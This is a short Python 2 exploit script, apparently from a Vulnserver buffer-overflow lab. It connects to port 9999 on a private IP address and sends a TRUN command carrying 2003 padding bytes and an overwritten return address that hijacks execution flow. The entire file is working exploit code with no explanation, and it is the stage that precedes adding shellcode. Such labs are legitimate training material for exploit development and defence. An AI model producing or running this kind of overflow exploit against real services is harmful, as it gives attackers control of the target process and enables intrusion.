import sys,socket

offset = "A"*2003 + "\xaf\x11\x50\x62"
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.100.88',9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print "[+] ERROR"
	sys.exit()
